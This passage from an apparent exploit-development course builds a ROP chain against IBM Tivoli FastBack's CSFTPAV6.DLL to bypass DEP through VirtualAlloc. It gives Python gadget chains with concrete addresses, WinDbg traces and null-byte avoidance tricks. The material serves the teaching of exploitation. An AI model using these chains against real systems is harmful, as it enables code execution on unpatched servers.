0d5fe300  76da38c0 KERNEL32!VirtualAllocStub
```

Listing 55 - Overwriting placeholder with VirtualAlloc

We have now achieved the goal we set at the beginning of this section. We successfully patched the address of VirtualAlloc at runtime in the API call skeleton placed on the stack by the buffer overflow.
Keep in mind that understanding how to build these types of ROP chains and how they work is critical to bypassing DEP and obtaining code execution.

In the next section, we will need to set up the API call return address in order to be able to execute our shellcode after the VirtualAlloc call.

### Patching the Return Address

When a function is called in assembly, the CALL instruction not only transfers execution flow to the function address, but at the same time pushes the return address to the top of the stack. Once the function finishes, the CPU aligns the stack pointer to the return address, which is then popped into EIP.

Since we control execution through the use of ROP gadgets, normal practices do not apply. Once we get to the point of executing VirtualAlloc, we will jump to it by returning into its address on the stack. This will not place any further return address on the stack.
To ensure that execution flow continues to our shellcode once the API finishes, we must manually place the shellcode address on the stack, right after the address of VirtualAlloc to simulate a real call. This way, our shellcode address will be at the top of the stack when VirtualAlloc finishes its job and executes a return instruction.
In this section, we must solve a problem very similar to patching the address of VirtualAlloc. First, we must align ESI with the placeholder value for the return address on the stack. Then we need to dynamically locate the address of the shellcode and use it to patch the placeholder value.

At the end of the last section, ESI contained the address on the stack where VirtualAlloc was written. This means that ESI is only four bytes lower than the stack address we need. An instruction like ADD ESI, 0x4 would be ideal, but it does not exist in our selected module.
A common instruction we might find in a gadget is the incremental (INC) instruction. These instructions increase the value in a register by one.
In our case, we can find an INC ESI instruction in multiple gadgets. None of the gadgets are clean, but it's possible to find one without any bad side effects, as shown in Listing 56.

```python
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
...
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += b"C" * (0x400 - 276 - 4 - len(rop))
```

Listing 56 - Increasing ESI by 4

In this listing, most of the ROP gadgets from the previous section have been omitted for brevity. Notice that we use the increment instruction four times to have ESI increased by four bytes. The side effect will only modify EAX, which we do not have to worry about at this point.
After setting our breakpoint at this new gadget and executing the updated ROP chain, we find that the increment gadgets are executed:
0:066> bp 0x50522fa7
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Tivoli\TSM\FastBack\server\CSFTPAV6.DLL - 

`g`

```
Breakpoint 0 hit
eax=76da38c0 ebx=05fbb3f8 ecx=ffffffff edx=77071670 esi=0d4fe300 edi=00000000
eip=50522fa7 esp=0d4fe354 ebp=51515151 iopl=0         nv up ei pl nz ac po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213
CSFTPAV6!FtpUploadFileW+0x12109:
50522fa7 46              inc     esi
```

`dd esi L2`

```
0d4fe300  76da38c0 46464646
```

`p`

```
eax=76da38c0 ebx=05fbb3f8 ecx=ffffffff edx=77071670 esi=0d4fe301 edi=00000000
eip=50522fa8 esp=0d4fe354 ebp=51515151 iopl=0         nv up ei pl nz na po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203
CSFTPAV6!FtpUploadFileW+0x1210a:
50522fa8 042b            add     al,2Bh
```

`p`

```
eax=76da38eb ebx=05fbb3f8 ecx=ffffffff edx=77071670 esi=0d4fe301 edi=00000000
eip=50522faa esp=0d4fe354 ebp=51515151 iopl=0         nv up ei ng nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000286
CSFTPAV6!FtpUploadFileW+0x1210c:
50522faa c3              ret
...
eax=76da3841 ebx=05fbb3f8 ecx=ffffffff edx=77071670 esi=0d4fe303 edi=00000000
eip=50522fa7 esp=0d4fe360 ebp=51515151 iopl=0         nv up ei pl nz ac pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216
CSFTPAV6!FtpUploadFileW+0x12109:
50522fa7 46              inc     esi
```

`p`

```
eax=76da3841 ebx=05fbb3f8 ecx=ffffffff edx=77071670 esi=0d4fe304 edi=00000000
eip=50522fa8 esp=0d4fe360 ebp=51515151 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
CSFTPAV6!FtpUploadFileW+0x1210a:
50522fa8 042b            add     al,2Bh
```

`dd esi L1`

```
0d4fe304  46464646
```

Listing 57 - Increasing ESI by 4

In Listing 57, we skipped from the first INC ESI to the last. Here we find that ESI is now pointing to the address of the placeholder value for the return address, which was initially set as 0x46464646.
With ESI aligned correctly, we need to get the shellcode address in EAX so that we can reuse the "MOV DWORD [ESI], EAX ; RET" gadget to patch the placeholder value. The issue we face now is that we do not know the exact address of the shellcode since it will be placed after our ROP chain, which we haven't finished creating yet.

We will solve this problem by using the value in ESI and adding a fixed value to it. Once we finish building the ROP chain, we can update the fixed value to correctly align with the beginning of the shellcode.
First, we need to copy ESI into EAX. We need to do this in such a way that we keep the existing value in ESI, since we need it there to patch the placeholder value. An instruction like "MOV EAX, ESI" is optimal, but unfortunately, the only gadgets containing this instruction also pop a value into ESI. We can however solve this by restoring the value in ESI with the previously-used "PUSH EAX ; POP ESI ; RET" gadget.
Since we need to add a small positive offset to EAX, we have to deal with null bytes again. We can solve this once more by using a negative value.

Here we can simply use an arbitrary value, such as 0x210 bytes, represented as the negative value 0xfffffdf0. (The reason we use 0x210 instead of 0x200 is to avoid null bytes.)

We pop this negative value into ECX and use a gadget containing a SUB EAX, ECX instruction to set up EAX correctly. The required gadgets are given in Listing 58 as part of the updated ROP chain.

```python
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
...
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x5050118e)) # mov eax, esi ; pop esi ; ret
rop += pack("<L", (0x42424242)) # junk
rop += pack("<L", (0x5052f773)) # push eax ; pop esi ; ret
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0xfffffdf0)) # -0x210
rop += pack("<L", (0x50533bf4)) # sub eax, ecx ; ret
rop += b"C" * (0x400 - 276 - 4 - len(rop))
```

Listing 58 - Getting shellcode address in EAX

Let's execute the ROP chain. This time, we can't simply set a breakpoint on the gadget that moves ESI into EAX and single-step from there, because we use it in an earlier part of the ROP chain.
Instead, we will let the breakpoint trigger twice before we start single-stepping.

`bp 0x5050118e`

```
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Tivoli\TSM\FastBack\server\CSFTPAV6.DLL - 
```

`g`

```
Breakpoint 0 hit
eax=00000000 ebx=05f2bd30 ecx=0d1fca70 edx=77071670 esi=0d1fe31c edi=00000000
eip=5050118e esp=0d1fe320 ebp=51515151 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
CSFTPAV6+0x118e:
5050118e 8bc6            mov     eax,esi
```

`g`

```
Breakpoint 0 hit
eax=76da386c ebx=05f2bd30 ecx=ffffffff edx=77071670 esi=0d1fe304 edi=00000000
eip=5050118e esp=0d1fe364 ebp=51515151 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
CSFTPAV6+0x118e:
5050118e 8bc6            mov     eax,esi
```

`p`

```
eax=0d1fe304 ebx=05f2bd30 ecx=ffffffff edx=77071670 esi=0d1fe304 edi=00000000
eip=50501190 esp=0d1fe364 ebp=51515151 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
CSFTPAV6+0x1190:
50501190 5e              pop     esi
```

`p`

```
eax=0d1fe304 ebx=05f2bd30 ecx=ffffffff edx=77071670 esi=42424242 edi=00000000
eip=50501191 esp=0d1fe368 ebp=51515151 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
CSFTPAV6+0x1191:
50501191 c3              ret
```

`p`

```
eax=0d1fe304 ebx=05f2bd30 ecx=ffffffff edx=77071670 esi=42424242 edi=00000000
eip=5052f773 esp=0d1fe36c ebp=51515151 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
CSFTPAV6!FtpUploadFileW+0x1e8d5:
5052f773 50              push    eax
```

`p`

```
eax=0d1fe304 ebx=05f2bd30 ecx=ffffffff edx=77071670 esi=42424242 edi=00000000
eip=5052f774 esp=0d1fe368 ebp=51515151 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
CSFTPAV6!FtpUploadFileW+0x1e8d6:
5052f774 5e              pop     esi
```

`p`

```
eax=0d1fe304 ebx=05f2bd30 ecx=ffffffff edx=77071670 esi=0d1fe304 edi=00000000
eip=5052f775 esp=0d1fe36c ebp=51515151 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
CSFTPAV6!FtpUploadFileW+0x1e8d7:
5052f775 c3              ret
```

`p`

```
eax=0d1fe304 ebx=05f2bd30 ecx=ffffffff edx=77071670 esi=0d1fe304 edi=00000000
eip=505115a3 esp=0d1fe370 ebp=51515151 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
CSFTPAV6!FtpUploadFileW+0x705:
505115a3 59              pop     ecx
```

`p`

```
eax=0d1fe304 ebx=05f2bd30 ecx=fffffdf0 edx=77071670 esi=0d1fe304 edi=00000000
eip=505115a4 esp=0d1fe374 ebp=51515151 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
CSFTPAV6!FtpUploadFileW+0x706:
505115a4 c3              ret
```

`p`

```
eax=0d1fe304 ebx=05f2bd30 ecx=fffffdf0 edx=77071670 esi=0d1fe304 edi=00000000
eip=50533bf4 esp=0d1fe378 ebp=51515151 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
CSFTPAV6!FtpUploadFileW+0x22d56:
50533bf4 2bc1            sub     eax,ecx
```

`p`

```
eax=0d1fe514 ebx=05f2bd30 ecx=fffffdf0 edx=77071670 esi=0d1fe304 edi=00000000
eip=50533bf6 esp=0d1fe378 ebp=51515151 iopl=0         nv up ei pl nz na pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207
CSFTPAV6!FtpUploadFileW+0x22d58:
50533bf6 c3              ret
```

`dd eax L4`

```
0d1fe514  43434343 43434343 43434343 43434343
```

Listing 59 - Calculating the shellcode address

Listing 59 shows that we successfully copied the value from ESI to EAX, while also restoring the original value in ESI. In addition, we subtracted a large negative value from EAX to add a small positive number to it. Once we know the exact offset from ESI to the shellcode, we can update the 0xfffffdf0 value to the correct one.
At this point, EAX contains a placeholder address for our shellcode, which we can update once we finish building the entire ROP chain.
The last step of this section is to overwrite the fake shellcode address (0x46464646) value on the stack. Once again, we can do this using a gadget containing a "MOV DWORD [ESI], EAX" instruction.

```python
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
...
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x5050118e)) # mov eax, esi ; pop esi ; ret
rop += pack("<L", (0x42424242)) # junk
rop += pack("<L", (0x5052f773)) # push eax ; pop esi ; ret
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0xfffffdf0)) # -0x210
rop += pack("<L", (0x50533bf4)) # sub eax, ecx ; ret
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
rop += b"C" * (0x400 - 276 - 4 - len(rop))
```

Listing 60 - Writing return address to the stack

This time, we can repeat the action of setting a breakpoint on the last gadget and continue execution until we trigger it the second time. Once we've done that, we can step through it as displayed in Listing 61.

`bp 0x5051cbb6`

```
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Tivoli\TSM\FastBack\server\CSFTPAV6.DLL - 
```

`g`

```
Breakpoint 0 hit
eax=76da38c0 ebx=05f9bc20 ecx=ffffffff edx=77071670 esi=0d1de300 edi=00000000
eip=5051cbb6 esp=0d1de350 ebp=51515151 iopl=0         nv up ei pl nz ac po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213
CSFTPAV6!FtpUploadFileW+0xbd18:
5051cbb6 8906            mov     dword ptr [esi],eax  ds:0023:0d1de300=45454545
```

`g`

```
Breakpoint 0 hit
eax=0d1de514 ebx=05f9bc20 ecx=fffffdf0 edx=77071670 esi=0d1de304 edi=00000000
eip=5051cbb6 esp=0d1de37c ebp=51515151 iopl=0         nv up ei pl nz na pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207
CSFTPAV6!FtpUploadFileW+0xbd18:
5051cbb6 8906            mov     dword ptr [esi],eax  ds:0023:0d1de304=46464646
```

`p`

```
eax=0d1de514 ebx=05f9bc20 ecx=fffffdf0 edx=77071670 esi=0d1de304 edi=00000000
eip=5051cbb8 esp=0d1de37c ebp=51515151 iopl=0         nv up ei pl nz na pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207
CSFTPAV6!FtpUploadFileW+0xbd1a:
5051cbb8 c3              ret
```

`dd poi(esi) L4`

```
0d1de514  43434343 43434343 43434343 43434343
```

Listing 61 - Overwriting the return address placeholder

Here we find that the gadget containing the "MOV DWORD [ESI], EAX" instruction successfully overwrote the placeholder value and the new return address points to our buffer.

After patching the return address, it is clear that building a ROP chain requires creativity. We also find that reusing the same gadgets helps when performing similar actions.
In the next section, we are going to set up the four arguments required for VirtualAlloc.

### Patching Arguments

We have successfully created and executed a partial ROP chain that locates the address of VirtualAlloc from the IAT and the shellcode address, and then updates the API call skeleton on the stack.
In this section, we must patch all four arguments required by VirtualAlloc to disable DEP.

Listing 62 repeats the prototype of VirtualAlloc, which includes the four required arguments.

```C
 LPVOID WINAPI VirtualAlloc(
   _In_opt_ LPVOID lpAddress,
   _In_     SIZE_T dwSize,
   _In_     DWORD  flAllocationType,
   _In_     DWORD  flProtect
 );
```

Listing 62 - VirtualAlloc function prototype

To reiterate, lpAddress should be the shellcode address, dwSize should be 0x01, flAllocationType should be 0x1000, and flProtect should be 0x40.

First, we are going to handle lpAddress, which should point to the same value as the return address.

At the end of the last section, ESI contained the address on the stack where the return address (shellcode address) was written. This means that ESI is only four bytes lower than lpAddress, and we can realign the register by reusing the same INC ESI instructions as we used before.
Additionally, since lpAddress needs to point to our shellcode, we can reuse the same gadgets as before and only subtract a different negative value from EAX.

In the previous example, we used the somewhat arbitrary value of -0x210 to align EAX to our shellcode. Since we increased ESI by 4, we need to use -0x20C or 0xfffffdf4 this time, as shown in the updated ROP chain below.

```python
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
...
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x5050118e)) # mov eax, esi ; pop esi ; ret
rop += pack("<L", (0x42424242)) # junk
rop += pack("<L", (0x5052f773)) # push eax ; pop esi ; ret
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0xfffffdf4)) # -0x20c
rop += pack("<L", (0x50533bf4)) # sub eax, ecx ; ret
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
rop += b"C" * (0x400 - 276 - 4 - len(rop))
```

Listing 63 - Fetching and writing lpAddress

The new part of the ROP chain also reuses the write gadget to overwrite the placeholder value in the API skeleton call.

It is getting a lot easier to expand on our technique because we have already located most of the required gadgets and performed similar actions.

To verify our ROP chain, we execute it. We set a breakpoint on the last gadget like we did in the last section, only this time we must continue execution until it is triggered the third time:

`bp 0x5051cbb6`

```
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Tivoli\TSM\FastBack\server\CSFTPAV6.DLL - 
```

`g`

```
Breakpoint 0 hit
eax=75f238c0 ebx=05ffafe8 ecx=ffffffff edx=77251670 esi=0d46e300 edi=00000000
eip=5051cbb6 esp=0d46e350 ebp=51515151 iopl=0         nv up ei pl nz ac po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213
CSFTPAV6!FtpUploadFileW+0xbd18:
5051cbb6 8906            mov     dword ptr [esi],eax  ds:0023:0d46e300=45454545
```

`g`

```
Breakpoint 0 hit
eax=0d46e514 ebx=05ffafe8 ecx=fffffdf0 edx=77251670 esi=0d46e304 edi=00000000
eip=5051cbb6 esp=0d46e37c ebp=51515151 iopl=0         nv up ei pl nz na pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207
CSFTPAV6!FtpUploadFileW+0xbd18:
5051cbb6 8906            mov     dword ptr [esi],eax  ds:0023:0d46e304=46464646
```

`g`

```
Breakpoint 0 hit
eax=0d46e514 ebx=05ffafe8 ecx=fffffdf4 edx=77251670 esi=0d46e308 edi=00000000
eip=5051cbb6 esp=0d46e3a8 ebp=51515151 iopl=0         nv up ei pl nz na pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207
CSFTPAV6!FtpUploadFileW+0xbd18:
5051cbb6 8906            mov     dword ptr [esi],eax  ds:0023:0d46e308=00000000
```

`dd eax L4`

```
0d46e514  43434343 43434343 43434343 43434343
```

Listing 64 - The first argument is written to the stack

We find that EAX points to our placeholder shellcode location and that it contains the same address when the breakpoint is triggered the second and third times. This means that our calculation was correct and the same shellcode location is going to be used for the return address and lpAddress.

Now we are going to move to dwSize, which we can set to 0x01, since VirtualAlloc will apply the new protections on the entire memory page. The issue is that the value is really a DWORD (0x00000001), so it will contain null bytes.

Once again, we must use a trick to avoid them, and in this case, we can take advantage of another math operation, negation. The NEG1 instruction will replace the value in a register with its two's complement.2

This is equivalent to subtracting the value from zero. When we do that with 0xffffffff (after ignoring the upper DWORD of the resulting QWORD), we get 0x01 (Listing 65):

`? 0 - ffffffff`

```
Evaluate expression: -4294967295 = ffffffff`00000001
```

Listing 65 - Subtracting 0xffffffff from 0 yields 0x1

Stripping the upper part is done automatically since registers on a 32-bit operating system can only contain the lower DWORD.
The steps we must perform for dwSize are:
•	Increase the ESI register by four with the increment gadgets to align it with the next placeholder argument in the API skeleton call.
•	Pop the value 0xffffffff into EAX and then negate it.
•	Write EAX onto the stack to patch the dwSize argument.
Listing 66 shows this implementation in the updated ROP chain.

```python
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
...
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x5053a0f5)) # pop eax ; ret 
rop += pack("<L", (0xffffffff)) # -1 value that is negated
rop += pack("<L", (0x50527840)) # neg eax ; ret
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
rop += b"C" * (0x400 - 276 - 4 - len(rop))
```

Listing 66 - Fetching and writing dwSize argument

When we execute the update ROP chain, we can set a breakpoint on the gadget containing the POP EAX instruction. We have already used it once before, so we need to continue to the second time the breakpoint is triggered:

`bp 0x5053a0f5`

```
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Tivoli\TSM\FastBack\server\CSFTPAV6.DLL - 
```

`g`

```
Breakpoint 0 hit
eax=0d57e300 ebx=05fabe40 ecx=ffffffe4 edx=77071670 esi=0d57e300 edi=00000000
eip=5053a0f5 esp=0d57e338 ebp=51515151 iopl=0         nv up ei pl nz ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
CSFTPAV6!FtpUploadFileW+0x29257:
5053a0f5 58              pop     eax
```

`g`

```
Breakpoint 0 hit
eax=0d57e5c0 ebx=05fabe40 ecx=fffffdf4 edx=77071670 esi=0d57e30c edi=00000000
eip=5053a0f5 esp=0d57e3bc ebp=51515151 iopl=0         nv up ei ng nz ac pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000296
CSFTPAV6!FtpUploadFileW+0x29257:
5053a0f5 58              pop     eax
```

`p`

```
eax=ffffffff ebx=05fabe40 ecx=fffffdf4 edx=77071670 esi=0d57e30c edi=00000000
eip=5053a0f6 esp=0d57e3c0 ebp=51515151 iopl=0         nv up ei ng nz ac pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000296
CSFTPAV6!FtpUploadFileW+0x29258:
5053a0f6 c3              ret
```

`p`

```
eax=ffffffff ebx=05fabe40 ecx=fffffdf4 edx=77071670 esi=0d57e30c edi=00000000
eip=50527840 esp=0d57e3c4 ebp=51515151 iopl=0         nv up ei ng nz ac pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000296
CSFTPAV6!FtpUploadFileW+0x169a2:
50527840 f7d8            neg     eax
```

`p`

```
eax=00000001 ebx=05fabe40 ecx=fffffdf4 edx=77071670 esi=0d57e30c edi=00000000
eip=50527842 esp=0d57e3c4 ebp=51515151 iopl=0         nv up ei pl nz ac po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213
CSFTPAV6!FtpUploadFileW+0x169a4:
50527842 c3              ret
```

`p`

```
eax=00000001 ebx=05fabe40 ecx=fffffdf4 edx=77071670 esi=0d57e30c edi=00000000
eip=5051cbb6 esp=0d57e3c8 ebp=51515151 iopl=0         nv up ei pl nz ac po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213
CSFTPAV6!FtpUploadFileW+0xbd18:
5051cbb6 8906            mov     dword ptr [esi],eax  ds:0023:0d57e30c=48484848
```

`p`

```
eax=00000001 ebx=05fabe40 ecx=fffffdf4 edx=77071670 esi=0d57e30c edi=00000000
eip=5051cbb8 esp=0d57e3c8 ebp=51515151 iopl=0         nv up ei pl nz ac po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213
CSFTPAV6!FtpUploadFileW+0xbd1a:
5051cbb8 c3              ret
```

`dd esi - c L4`

```
0d57e300  76da38c0 0d57e514 0d57e514 00000001
```

Listing 67 - Writing dwSize argument to the stack

The negation trick works and we end up with 0x01 in EAX, which is then written to the stack. Listing 67 also shows the resulting stack layout of the values that are written so far, and it is clear that the return address and lpAddress are equal.

Now we must move to flAllocationType, which must be set to 0x1000. We could try to reuse the trick of negation but we notice that two's complement to 0x1000 is 0xfffff000, which also contains null bytes:

`? 0 - 1000`

```
Evaluate expression: -4096 = fffff000
```

Listing 68 - Two's complement for 0x1000

While it would be possible to perform some tricks to fix this problem, we are going to use a different technique to highlight the fact that when selecting gadgets, we must often think creatively.
We're going to use the existing gadgets we found, which will allow us to pop arbitrary values into EAX and ECX and subsequently perform an addition of them.

Let's choose a large, arbitrary value like 0x80808080 that does not contain null-bytes. if we subtract this value from 0x1000, we get the value 0x7F7F8F80 which is also null free.

`? 1000 - 80808080`

```
Evaluate expression: -2155901056 = ffffffff`7f7f8f80
```

`? 80808080 + 7f7f8f80`

```
Evaluate expression: 4294971392 = 00000001`00001000
```

Listing 69 - Finding large values that add to 0x1000

Now we need to update our ROP chain to pop 0x80808080 into EAX, pop 0x7f7f8f80 into ECX, and then add them together.

```python
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
...
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x5053a0f5)) # pop eax ; ret 
rop += pack("<L", (0x80808080)) # first value to be added
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0x7f7f8f80)) # second value to be added
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
rop += b"C" * (0x400 - 276 - 4 - len(rop))
```

Listing 70 - Fetching and writing flAllocationType argument

Notice that we began by increasing ESI by four as usual to align to the next API argument, and we also reused the same write gadget at the end of the chain to update the flAllocationType value on the stack.
To view this in action, we set a breakpoint on the "ADD EAX, ECX" ROP gadget at address 0x5051579a. Since this gadget is used multiple times, we can create a conditional breakpoint to avoid breaking at it each time.

We know that EAX must contain the value 0x80808080 when EAX and ECX are added together. We'll use the .if statement in our breakpoint in order to break on the target address only when EAX is set to 0x80808080. Due to sign extension, we must perform a bitwise AND operation to obtain the correct result in the comparison.
The breakpoint and execution of the ROP gadgets is shown in Listing 71.

bp 0x5051579a ".if (@eax & 0x0`ffffffff) = 0x80808080 {} .else {gc}"
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Tivoli\TSM\FastBack\server\CSFTPAV6.DLL - 

`g`

```
eax=80808080 ebx=05f9b648 ecx=7f7f8f80 edx=77251670 esi=0d39e310 edi=00000000
eip=5051579a esp=0d39e3ec ebp=51515151 iopl=0         nv up ei ng nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000282
CSFTPAV6!FtpUploadFileW+0x48fc:
5051579a 03c1            add     eax,ecx
```

`p`

```
eax=00001000 ebx=05f9b648 ecx=7f7f8f80 edx=77251670 esi=0d39e310 edi=00000000
eip=5051579c esp=0d39e3ec ebp=51515151 iopl=0         nv up ei pl nz na pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207
CSFTPAV6!FtpUploadFileW+0x48fe:
5051579c c3              ret
```

`p`

```
eax=00001000 ebx=05f9b648 ecx=7f7f8f80 edx=77251670 esi=0d39e310 edi=00000000
eip=5051cbb6 esp=0d39e3f0 ebp=51515151 iopl=0         nv up ei pl nz na pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207
CSFTPAV6!FtpUploadFileW+0xbd18:
5051cbb6 8906            mov     dword ptr [esi],eax  ds:0023:0d39e310=00000000
```

Listing 71 - Patching flAllocationType on the stack

We find that the ADD operation created the correct value in EAX (0x1000), which was then used to patch the placeholder argument on the stack.

The last argument is the new memory protection value, which, in essence, is what allows us to bypass DEP. We want the enum PAGE_EXECUTE_READWRITE, which has the numerical value 0x40.
In order to write that to the stack, we will reuse the same technique we did for flAllocationType. Listing 72 shows us the values to use.

`? 40 - 80808080`

```
Evaluate expression: -2155905088 = ffffffff`7f7f7fc0
```

`? 80808080 + 7f7f7fc0`

```
Evaluate expression: 4294967360 = 00000001`00000040
```

Listing 72 - Finding two values that add to 0x40

According to the additions, we can use the values 0x80808080 and 0x7f7f7fc0 to obtain the desired value of 0x40. Listing 73 illustrates the ROP chain to implement. It is an exact copy of the previous one except for the values to add.

```python
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
...
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x5053a0f5)) # pop eax ; ret 
rop += pack("<L", (0x80808080)) # first value to be added
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0x7f7f7fc0)) # second value to be added
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
rop += pack("<L", (0x5051e4db)) # int3 ; push eax ; call esi
rop += b"C" * (0x400 - 276 - 4 - len(rop))
```

Listing 73 - Fetching and writing flProtect argument

After the last gadget, which writes the flProtect argument to the stack, we add an additional gadget. This gadget's first instruction is a software breakpoint and will not be part of the final exploit. This will allow us to execute the entire ROP chain and catch the execution flow just after the flProtect dummy value has been patched.

`g`

```
(146c.1dcc): Break instruction exception - code 80000003 (first chance)
